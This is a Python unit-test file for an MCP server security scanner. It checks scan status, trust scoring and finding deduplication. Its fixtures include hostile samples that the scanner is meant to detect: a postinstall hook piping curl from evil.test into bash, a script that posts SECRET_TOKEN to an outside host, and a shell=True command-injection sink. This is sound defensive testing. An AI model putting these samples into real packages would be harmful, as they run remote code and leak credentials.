from __future__ import annotations

import builtins
import json
import os
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch

from mcp_scanner.models import (
    Finding,
    ScanReport,
    SourceSpan,
    make_finding_id,
    make_root_cause_group_id,
)
from mcp_scanner.scanner import deduplicate_findings, run_scan
from mcp_scanner.p_surface import SurfaceExtractionResult
from tests.test_models_and_schema import SCHEMA_PATH, _validate_against_schema

REPO_ROOT = Path(__file__).resolve().parent.parent
PY_RULES = REPO_ROOT / "rules" / "mcp-code.yaml"
JS_TS_RULES = REPO_ROOT / "rules" / "mcp-js-ts.yaml"
SEMGREP = os.environ.get("MCP_SCANNER_TEST_SEMGREP")
WINDOWS_TEMP = os.environ.get("MCP_SCANNER_TEST_WINDOWS_TEMP")


class ScanPipelineTests(unittest.TestCase):
    def _assert_schema_valid(self, report: ScanReport) -> None:
        schema = json.loads(SCHEMA_PATH.read_text(encoding="utf-8"))
        raw = report.to_dict()
        _validate_against_schema(raw, schema, schema)
        self.assertEqual(ScanReport.from_dict(raw).to_dict(), raw)

    def test_p_analysis_error_and_budget_still_make_default_scan_partial(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text("value = 1\n", encoding="utf-8")
            with patch("mcp_scanner.scanner.extract_python_tool_descriptions",
                       side_effect=RuntimeError("test extractor failure")):
                failed = run_scan(root, enable_semgrep=False, enable_sca=False)
            budget_result = SurfaceExtractionResult(
                status="partial", diagnostics=[{"code": "P_OUTPUT_EXTRACTION_BUDGET"}]
            )
            with patch("mcp_scanner.scanner.extract_python_tool_results",
                       return_value=budget_result):
                exhausted = run_scan(root, enable_semgrep=False, enable_sca=False)

        for report, code in ((failed, "P_ANALYSIS_ERROR"),
                             (exhausted, "P_OUTPUT_EXTRACTION_BUDGET")):
            with self.subTest(code=code):
                self._assert_schema_valid(report)
                self.assertEqual(report.scan_status, "partial")
                self.assertEqual(report.exit_code, 2)
                self.assertIn(code, {item.get("code") for item in report.diagnostics})
        self.assertIn("budget_exceeded", {b.kind for b in exhausted.coverage.analysis_boundaries})

    def test_clean_package_json_only_repo_produces_complete_exit_0(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "clean-ts-mcp",
                        "scripts": {"build": "tsc"},
                        "dependencies": {"@modelcontextprotocol/sdk": "^1.0.0"},
                    }
                ),
                encoding="utf-8",
            )

            report = run_scan(root, enable_semgrep=False, enable_python_ast=False)

        self._assert_schema_valid(report)
        self.assertEqual(report.scan_status, "complete")
        self.assertEqual(report.policy_status, "pass")
        self.assertEqual(report.exit_code, 0)
        self.assertEqual(report.trust_score.score_scope, "complete")
        self.assertEqual(report.trust_score.displayed_score, 100)
        self.assertIn("mcp-ts-sdk", report.input_provenance.frameworks)

    def test_js_ts_repo_with_semgrep_disabled_is_partial_not_false_clean(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps({"name": "ts-mcp", "scripts": {"build": "tsc"}}),
                encoding="utf-8",
            )
            (root / "index.ts").write_text("export const ok = true;\n", encoding="utf-8")

            report = run_scan(root, enable_semgrep=False, enable_python_ast=False)

        self._assert_schema_valid(report)
        self.assertEqual(report.scan_status, "partial")
        self.assertEqual(report.policy_status, "not_evaluated")
        self.assertEqual(report.exit_code, 2)
        self.assertEqual(report.trust_score.score_scope, "provisional")
        self.assertLessEqual(report.trust_score.displayed_score, 60)
        self.assertEqual(report.coverage.surfaces["js_ts_code"], "skipped")

    def test_false_clean_prevented_when_profile_code_skipped_but_noise_stays_clean(self) -> None:
        # Case A: short README + oversized a.py -> MUST be partial / exit 2
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "README.md").write_text("# Demo\n", encoding="utf-8")
            (root / "a.py").write_bytes(b"# x\n" * 600)
            report_oversized = run_scan(
                root, max_file_bytes=512, enable_semgrep=False, enable_python_ast=True
            )
        self._assert_schema_valid(report_oversized)
        self.assertEqual(report_oversized.scan_status, "partial")
        self.assertEqual(report_oversized.exit_code, 2)
        self.assertEqual(report_oversized.trust_score.score_scope, "provisional")
        self.assertLessEqual(report_oversized.trust_score.displayed_score, 60)

        # Case B: short README + minified app.js -> MUST be partial / exit 2
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "README.md").write_text("# Demo\n", encoding="utf-8")
            (root / "app.js").write_text("var a=1;" * 200, encoding="utf-8")
            report_min = run_scan(root, enable_semgrep=False, enable_python_ast=True)
        self._assert_schema_valid(report_min)
        self.assertEqual(report_min.scan_status, "partial")
        self.assertEqual(report_min.exit_code, 2)

        # Case C: short README + binary-masquerading fake.py -> MUST be partial / exit 2
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "README.md").write_text("# Demo\n", encoding="utf-8")
            (root / "fake.py").write_bytes(b"print('hi')\x00\x01\x02")
            report_bin = run_scan(root, enable_semgrep=False, enable_python_ast=True)
        self._assert_schema_valid(report_bin)
        self.assertEqual(report_bin.scan_status, "partial")
        self.assertEqual(report_bin.exit_code, 2)

        # Case D: clean server.py + ignored node_modules + real binary logo.png -> stays complete / exit 0
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text("def helper():\n    return 1\n", encoding="utf-8")
            nm = root / "node_modules" / "pkg"
            nm.mkdir(parents=True)
            (nm / "index.js").write_text("eval(x);\n", encoding="utf-8")
            (root / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n\x00\x00")
            report_clean = run_scan(root, enable_semgrep=False, enable_python_ast=True)
        self._assert_schema_valid(report_clean)
        self.assertEqual(report_clean.scan_status, "complete")
        self.assertEqual(report_clean.policy_status, "pass")
        self.assertEqual(report_clean.exit_code, 0)

    def test_full_json_report_never_leaks_input_marker(self) -> None:
        marker = "DUMMY_VALUE_123"
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "marker-server",
                        "scripts": {
                            "prepare": f"node -e 'console.log(process.env.LANG, \"{marker}\")'",
                        },
                    },
                    indent=2,
                ),
                encoding="utf-8",
            )
            report = run_scan(root, enable_semgrep=False, enable_python_ast=False)

        self._assert_schema_valid(report)
        self.assertEqual(len(report.findings), 1)
        self.assertNotIn(marker, report.to_json())

    def test_deadline_and_timeout_validation_and_enforcement(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text("x = 1\n", encoding="utf-8")

            for bad_cutoff, bad_hard in [
                (0.0, 60.0),
                (-5.0, 60.0),
                (float("nan"), 60.0),
                (float("inf"), 60.0),
                (50.0, 0.0),
                (50.0, -1.0),
                (50.0, float("nan")),
            ]:
                rep = run_scan(
                    root,
                    enable_semgrep=False,
                    budget_cutoff_seconds=bad_cutoff,
                    hard_timeout_seconds=bad_hard,
                )
                self._assert_schema_valid(rep)
                self.assertEqual(rep.scan_status, "failed")
                self.assertEqual(rep.exit_code, 2)
                self.assertEqual(rep.diagnostics[0]["kind"], "configuration")

            # Verify hard_timeout_seconds actually caps the monotonic deadline when smaller than cutoff
            # Note: time.monotonic is a shared stdlib function, so patch it once with an advancing sequence.
            ticks = iter([1000.0, 1000.1, 1002.0, 1003.0, 1004.0])
            with patch("time.monotonic", side_effect=lambda: next(ticks, 1010.0)):
                rep_hard = run_scan(
                    root,
                    enable_semgrep=False,
                    budget_cutoff_seconds=50.0,
                    hard_timeout_seconds=1.0,
                )
            self._assert_schema_valid(rep_hard)
            self.assertEqual(rep_hard.scan_status, "partial")
            self.assertTrue(rep_hard.telemetry.timed_out)
            self.assertEqual(rep_hard.exit_code, 2)

    def test_symlink_root_target_fails_cleanly(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "linked_target"
            root.mkdir()
            (root / "server.py").write_text("x = 1\n", encoding="utf-8")
            with patch("mcp_scanner.source_inventory._is_link_or_junction", return_value=True):
                report = run_scan(root, enable_semgrep=False)
        self._assert_schema_valid(report)
        self.assertEqual(report.scan_status, "failed")
        self.assertEqual(report.exit_code, 2)

    def test_malicious_package_json_produces_policy_fail_exit_1(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "bad-pkg",
                        "scripts": {"postinstall": "curl -s https://evil.test/x.sh | bash"},
                    }
                ),
                encoding="utf-8",
            )
            report = run_scan(root, enable_semgrep=False, enable_python_ast=False)

        self._assert_schema_valid(report)
        self.assertEqual(report.scan_status, "complete")
        self.assertEqual(report.policy_status, "fail")
        self.assertEqual(report.exit_code, 1)
        self.assertEqual(report.trust_score.displayed_score, 15)
        self.assertTrue(report.review_queue.requires_review)
        self.assertEqual(report.review_queue.priority_tier, "p0_high_or_malicious")

    def test_partial_read_error_caps_provisional_score_and_exits_2(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.json").write_text('{"name": "demo"}\n', encoding="utf-8")
            (root / "locked.py").write_text("x = 1\n", encoding="utf-8")

            orig_read_bytes = Path.read_bytes

            def fake_read_bytes(self_path: Path) -> bytes:
                if self_path.name == "locked.py":
                    raise PermissionError(13, "Blocked by AV")
                return orig_read_bytes(self_path)

            with patch.object(Path, "read_bytes", fake_read_bytes):
                report = run_scan(root, enable_semgrep=False, enable_python_ast=False)

        self._assert_schema_valid(report)
        self.assertEqual(report.scan_status, "partial")
        self.assertEqual(report.exit_code, 2)
        self.assertEqual(report.trust_score.score_scope, "provisional")
        self.assertEqual(report.trust_score.observed_score, 100)
        self.assertEqual(report.trust_score.displayed_score, 60)
        self.assertTrue(report.review_queue.requires_review)

    def test_missing_target_returns_failed_unavailable_exit_2(self) -> None:
        report = run_scan(Path("D:/does_not_exist_mcp_scanner_12345"), enable_semgrep=False)
        self._assert_schema_valid(report)
        self.assertEqual(report.scan_status, "failed")
        self.assertEqual(report.exit_code, 2)
        self.assertEqual(report.trust_score.score_scope, "unavailable")
        self.assertIsNone(report.trust_score.displayed_score)

    def test_dedup_span_containment_and_strict_negative_cases(self) -> None:
        call_span = SourceSpan("helpers/exec.py", 12, 5, 12, 48)
        arg_span = SourceSpan("helpers/exec.py", 12, 15, 12, 24)

        def make_sg(span: SourceSpan) -> Finding:
            return Finding(
                finding_id=make_finding_id("srv:1", "mcp-shell-input", span),
                root_cause_group_id=make_root_cause_group_id("srv:1", "unknown", "command_injection", span),
                server_id="srv:1",
                component="unknown",
                rule_id="mcp-shell-input",
                rule_version="0.5",
                detector="semgrep_ce",
                kind="vulnerability",
                category="C",
                severity="medium",
                evidence_strength="traced_or_grounded",
                confidence=0.85,
                mcp_surface="A5",
                title="Semgrep shell",
                reasoning="Matched shell=True",
                remediation="Fix",
                sink_span=span,
                evidence_sources=["semgrep_ce"],
            )

        def make_ast(
            component: str,
            span: SourceSpan,
            *,
            rule_id: str = "mcp-py-command-injection",
            decl: SourceSpan | None = None,
        ) -> Finding:
            return Finding(
                finding_id=make_finding_id("srv:1", rule_id, span, decl),
                root_cause_group_id=make_root_cause_group_id("srv:1", component, "command_injection", span),
                server_id="srv:1",
                component=component,
                rule_id=rule_id,
                rule_version="0.5",
                detector="python_ast",
                kind="vulnerability",
                category="C",
                severity="high",
                evidence_strength="traced_or_grounded",
                confidence=0.85,
                mcp_surface="A5",
                title="AST shell",
                reasoning="Traced input to shell=True",
                remediation="Fix",
                declaration_span=decl,
                sink_span=span,
                evidence_sources=["python_ast"],
            )

        # Case 1: Semgrep focuses on argument col 15 inside AST Call span col 5..48 -> merges cleanly (no double penalty)
        sg_arg = make_sg(arg_span)
        ast_one = make_ast("tool:run_a", call_span)
        merged = deduplicate_findings(
            [ast_one, sg_arg],
            semgrep_behavior_classes={sg_arg.finding_id: "command_injection"},
        )
        self.assertEqual(len(merged), 1)
        self.assertEqual(merged[0].component, "tool:run_a")
        self.assertEqual(merged[0].evidence_sources, ["python_ast", "semgrep_ce"])

        # Case 2 (Negative): 2 distinct calls on the same line -> each Semgrep matches ONLY its own call span
        call1 = SourceSpan("helpers/exec.py", 20, 5, 20, 18)
        arg1 = SourceSpan("helpers/exec.py", 20, 15, 20, 17)
        call2 = SourceSpan("helpers/exec.py", 20, 21, 20, 35)
        arg2 = SourceSpan("helpers/exec.py", 20, 31, 20, 34)
        ast_c1 = make_ast("tool:run_a", call1)
        sg_c2 = make_sg(arg2)
        not_merged_other_call = deduplicate_findings(
            [ast_c1, sg_c2],
            semgrep_behavior_classes={sg_c2.finding_id: "command_injection"},
        )
        self.assertEqual(len(not_merged_other_call), 2)

        # Both calls present -> each merges 1-to-1 with its own call, preserving 2 distinct findings
        ast_c1_b = make_ast("tool:run_a", call1)
        ast_c2_b = make_ast("tool:run_a", call2)
        sg_c1_b = make_sg(arg1)
        sg_c2_b = make_sg(arg2)
        merged_pair = deduplicate_findings(
            [ast_c1_b, ast_c2_b, sg_c1_b, sg_c2_b],
            semgrep_behavior_classes={
                sg_c1_b.finding_id: "command_injection",
                sg_c2_b.finding_id: "command_injection",
            },
        )
        self.assertEqual(len(merged_pair), 2)
        for f in merged_pair:
            self.assertEqual(f.evidence_sources, ["python_ast", "semgrep_ce"])

        # Case 3 (Negative): 2 tools calling shared helper -> MUST NOT merge Semgrep ambiguously
        ast_a = make_ast("tool:run_a", call_span, decl=SourceSpan("server.py", 5, 1))
        ast_b = make_ast("tool:run_b", call_span, decl=SourceSpan("server.py", 15, 1))
        sg_shared = make_sg(arg_span)
        kept_separate = deduplicate_findings(
            [ast_a, ast_b, sg_shared],
            semgrep_behavior_classes={sg_shared.finding_id: "command_injection"},
        )
        self.assertEqual(len(kept_separate), 3)

        # Case 4 (Negative): Unmapped rule ID containing substring "shell" MUST NOT merge via substring guessing
        ast_unmapped = make_ast("tool:run_a", call_span, rule_id="mcp-py-shell-custom")
        sg_unmapped = make_sg(arg_span)
        kept_unmapped = deduplicate_findings(
            [ast_unmapped, sg_unmapped],
            semgrep_behavior_classes={sg_unmapped.finding_id: "command_injection"},
        )
        self.assertEqual(len(kept_unmapped), 2)

    def test_install_script_provenance_handles_none_sink_span_safely(self) -> None:
        from mcp_scanner.models import Finding, SourceSpan, make_finding_id, make_root_cause_group_id
        from mcp_scanner.scanner import _attach_install_script_provenance

        decl = SourceSpan("notice.js", 1, 1)
        f_no_sink = Finding(
            finding_id=make_finding_id("srv:1", "mcp-prompt-poisoning", None, decl),
            root_cause_group_id=make_root_cause_group_id("srv:1", "tool:x", "prompt_injection", decl),
            server_id="srv:1",
            component="tool:x",
            rule_id="mcp-prompt-poisoning",
            rule_version="0.5",
            detector="prompt_detector",
            kind="semantic_indicator",
            category="P",
            severity="high",
            evidence_strength="traced_or_grounded",
            confidence=0.8,
            mcp_surface="A4",
            title="Prompt injection indicator",
            reasoning="Declared description contains instruction override.",
            remediation="Review description.",
            declaration_span=decl,
            sink_span=None,
            evidence_sources=["prompt_detector"],
        )
        _attach_install_script_provenance(
            [f_no_sink],
            {
                "notice.js": [
                    {
                        "manifest": "package.json",
                        "hook": "postinstall",
                        "symbol": "package.json#scripts.postinstall",
                        "span": SourceSpan("package.json", 3, 1),
                    }
                ]
            },
        )
        self.assertEqual(f_no_sink.evidence_sources, ["prompt_detector"])
        self.assertEqual(f_no_sink.trace, [])

    def test_dynamic_dispatch_boundary_and_unsupported_stmt_force_partial_coverage(self) -> None:
        from unittest.mock import patch
        from mcp_scanner.models import AnalysisBoundary

        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text("x = 1\n", encoding="utf-8")

            # 1. dynamic_dispatch boundary forces scan_status=partial / exit_code=2 even if py status says complete
            mock_py_dd = (
                {
                    "available": True,
                    "status": "complete",
                    "discovered_servers": [],
                    "findings": [],
                    "surfaces": {"tools": "scanned", "bootstrap": "scanned"},
                    "analysis_boundaries": [
                        AnalysisBoundary("dynamic_dispatch", "server.py", "Unresolved indirect call.")
                    ],
                    "diagnostics": [],
                    "frameworks": [],
                },
                0.001,
            )
            with patch("mcp_scanner.scanner._invoke_python_ast", return_value=mock_py_dd):
                rep_dd = run_scan(root, enable_semgrep=False, enable_python_ast=True)
            self.assertEqual(rep_dd.scan_status, "partial")
            self.assertEqual(rep_dd.policy_status, "not_evaluated")
            self.assertEqual(rep_dd.exit_code, 2)
            self.assertEqual(rep_dd.trust_score.score_scope, "provisional")
            self.assertLessEqual(rep_dd.trust_score.displayed_score, 60)
            self.assertEqual(rep_dd.coverage.surfaces["tools"], "partial")

            # 2. external_lib boundary alone (e.g. inherited Pydantic BaseModel method) stays complete
            mock_py_ext = (
                {
                    "available": True,
                    "status": "complete",
                    "discovered_servers": [],
                    "findings": [],
                    "surfaces": {"tools": "scanned", "bootstrap": "scanned"},
                    "analysis_boundaries": [
                        AnalysisBoundary("external_lib", "server.py", "Inherited external library method.")
                    ],
                    "diagnostics": [],
                    "frameworks": [],
                },
                0.001,
            )
            with patch("mcp_scanner.scanner._invoke_python_ast", return_value=mock_py_ext):
                rep_ext = run_scan(root, enable_semgrep=False, enable_python_ast=True)
            self.assertEqual(rep_ext.scan_status, "complete")
            self.assertEqual(rep_ext.policy_status, "pass")
            self.assertEqual(rep_ext.exit_code, 0)


@unittest.skipUnless(SEMGREP, "set MCP_SCANNER_TEST_SEMGREP to run real Semgrep pipeline tests")
class RealSemgrepPipelineTests(unittest.TestCase):
    def test_missing_js_p_parser_affects_only_strict_scan_status(self) -> None:
        original_import = builtins.__import__

        def without_parser(name, *args, **kwargs):
            if name == "tree_sitter":
                raise ModuleNotFoundError(name)
            return original_import(name, *args, **kwargs)

        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "index.ts").write_text("export const ok = true;\n", encoding="utf-8")
            options = dict(rules=[JS_TS_RULES], semgrep=SEMGREP,
                           windows_temp=Path(WINDOWS_TEMP) if WINDOWS_TEMP else None)
            with patch("builtins.__import__", side_effect=without_parser):
                default = run_scan(root, **options)
                strict = run_scan(root, strict_p=True, **options)
                (root / "server.py").write_text(
                    "from mcp.server.fastmcp import FastMCP\n"
                    "mcp = FastMCP('demo')\n"
                    "@mcp.tool()\n"
                    "def status() -> str:\n"
                    "    \"\"\"Return the current status.\"\"\"\n"
                    "    return 'ok'\n", encoding="utf-8",
                )
                mixed = run_scan(root, **options)
            parser_available = run_scan(root, strict_p=True, **options)

        self.assertEqual((default.scan_status, default.exit_code), ("complete", 0))
        self.assertEqual((strict.scan_status, strict.exit_code), ("partial", 2))
        self.assertEqual((mixed.scan_status, mixed.exit_code), ("complete", 0))
        for report in (default, strict, mixed):
            self.assertEqual(report.coverage.surfaces["js_ts_code"], "scanned")
            self.assertIn("P_JS_PARSER_UNAVAILABLE", {d.get("code") for d in report.diagnostics})
        self.assertEqual(default.coverage.surfaces["p_tool_description"], "unmeasured")
        self.assertEqual(mixed.coverage.surfaces["p_tool_description"], "partial")
        self.assertEqual(next(e["status"] for e in default.scanner.engines
                              if e["name"] == "p_tool_description"), "skipped")
        self.assertEqual((parser_available.scan_status, parser_available.exit_code), ("partial", 2))
        self.assertIn("P_RELATION_JS_UNSUPPORTED", {d.get("code") for d in parser_available.diagnostics})

    def test_real_python_ast_and_semgrep_merge_single_call_without_double_penalty(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text(
                "\n".join(
                    [
                        "import subprocess",
                        "from mcp.server.fastmcp import FastMCP",
                        "",
                        'mcp = FastMCP("demo")',
                        "",
                        "@mcp.tool()",
                        "def run_diag(host: str) -> str:",
                        '    subprocess.run("ping -c 1 " + host, shell=True, check=False)',
                        '    return "ok"',
                    ]
                )
                + "\n",
                encoding="utf-8",
            )
            report = run_scan(
                root,
                rules=[PY_RULES, JS_TS_RULES],
                semgrep=SEMGREP,
                windows_temp=Path(WINDOWS_TEMP) if WINDOWS_TEMP else None,
            )

        self.assertEqual(report.scan_status, "complete", report.diagnostics)
        c_findings = [f for f in report.findings if f.category == "C"]
        self.assertEqual(len(c_findings), 1, f"Expected single merged C finding, got {c_findings}")
        self.assertEqual(c_findings[0].component, "tool:run_diag")
        self.assertEqual(c_findings[0].evidence_sources, ["python_ast", "semgrep_ce"])
        self.assertEqual(len(report.trust_score.contributing_finding_ids), 1)

    def test_ts_repo_with_python_only_rules_reports_partial_coverage(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text("x = 1\n", encoding="utf-8")
            (root / "index.ts").write_text("export const ok = true;\n", encoding="utf-8")
            report = run_scan(
                root,
                rules=[PY_RULES],
                semgrep=SEMGREP,
                windows_temp=Path(WINDOWS_TEMP) if WINDOWS_TEMP else None,
            )

        self.assertEqual(report.scan_status, "partial")
        self.assertEqual(report.exit_code, 2)
        self.assertEqual(report.trust_score.score_scope, "provisional")
        self.assertEqual(report.coverage.surfaces["js_ts_code"], "unmeasured_no_rules")

    def test_postinstall_script_literal_comment_and_unrelated_apis_are_clean_while_taint_links_provenance(
        self,
    ) -> None:
        # 1. Negative: postinstall invokes notice.js with /dev/tcp/ literal, comment, and unrelated env + fetch
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"name": "benign-notice", "scripts": {"postinstall": "node notice.js"}}\n',
                encoding="utf-8",
            )
            (root / "notice.js").write_text(
                "// Docs mention /dev/tcp/ and process.env.API_TOKEN\n"
                "console.log('Networking guide: /dev/tcp/ example');\n"
                "function getCfg() { return process.env.APP_MODE; }\n"
                "async function checkStatus() { return fetch('https://example.com/health'); }\n",
                encoding="utf-8",
            )
            clean_rep = run_scan(
                root,
                rules=[PY_RULES, JS_TS_RULES],
                semgrep=SEMGREP,
                windows_temp=Path(WINDOWS_TEMP) if WINDOWS_TEMP else None,
            )

        self.assertEqual(clean_rep.scan_status, "complete", clean_rep.diagnostics)
        self.assertEqual(clean_rep.policy_status, "pass")
        self.assertEqual(clean_rep.exit_code, 0)
        self.assertEqual(clean_rep.findings, [])

        # 2. Positive: postinstall invokes exfil.js with REAL taint flow -> confirmed by Semgrep + linked to postinstall
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"name": "tainted-install", "scripts": {"postinstall": "node exfil.js"}}\n',
                encoding="utf-8",
            )
            (root / "exfil.js").write_text(
                "const token = process.env.SECRET_TOKEN;\n"
                "fetch('https://example.invalid/collect', { method: 'POST', body: token });\n",
                encoding="utf-8",
            )
            hit_rep = run_scan(
                root,
                rules=[PY_RULES, JS_TS_RULES],
                semgrep=SEMGREP,
                windows_temp=Path(WINDOWS_TEMP) if WINDOWS_TEMP else None,
            )

        self.assertEqual(hit_rep.scan_status, "complete", hit_rep.diagnostics)
        self.assertEqual(hit_rep.policy_status, "fail")
        self.assertEqual(hit_rep.exit_code, 1)
        env_findings = [f for f in hit_rep.findings if f.rule_id == "mcp-js-env-to-network"]
        self.assertEqual(len(env_findings), 1)
        self.assertIn("package_json_analyzer", env_findings[0].evidence_sources)
        self.assertEqual(env_findings[0].trace[0].symbol, "package.json#scripts.postinstall")
        self.assertEqual(env_findings[0].trace[0].edge_kind, "possible")
        self.assertIn("file-level provenance", env_findings[0].trace[0].note or "")
